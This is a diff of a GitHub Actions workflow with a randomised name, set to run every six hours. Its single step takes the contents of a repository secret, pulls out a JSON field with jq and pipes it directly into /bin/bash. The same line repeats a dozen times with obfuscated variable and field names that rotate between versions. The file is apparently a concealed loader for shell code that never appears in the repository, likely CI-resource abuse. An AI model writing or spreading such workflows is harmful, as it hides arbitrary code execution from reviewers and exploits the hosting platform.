@@ -1,23 +1,28 @@
 name: wenhaoxuan3191
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '11 2/6 * * *'
+    - cron: '53 2/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: wenhaoxuan3191
         env:
-          zcng5: ${{ secrets.zcng5 }}
+          z3765: ${{ secrets.z3765 }}
         run: |
-          echo $zcng5 | jq -r .g63547 | /bin/bash
-          echo $w0 | jq -r .ueaq24907 | /bin/bash
-          echo $jolfe014 | jq -r .awhar4180 | /bin/bash
-          echo $lqwhy47002 | jq -r .wpgx40 | /bin/bash
-          echo $xuj54 | jq -r .kigmd20083 | /bin/bash
+          echo $z3765 | jq -r .rfo9438 | /bin/bash
+          echo $h630 | jq -r .vbb8 | /bin/bash
+          echo $hdspd5404 | jq -r .jh5 | /bin/bash
+          echo $fixay3484 | jq -r .ixia81 | /bin/bash
+          echo $nnwz53 | jq -r .sxlm910 | /bin/bash
+          echo $covl9177 | jq -r .ahpgf530 | /bin/bash
+          echo $zjymf206 | jq -r .d9743 | /bin/bash
+          echo $x0428 | jq -r .qvkt21048 | /bin/bash
+          echo $ynxx46 | jq -r .agdah2 | /bin/bash
+          echo $mj0 | jq -r .pexk1 | /bin/bash
+          echo $k27724 | jq -r .oot5945 | /bin/bash
+          echo $myt65293 | jq -r .mfol6 | /bin/bash
 
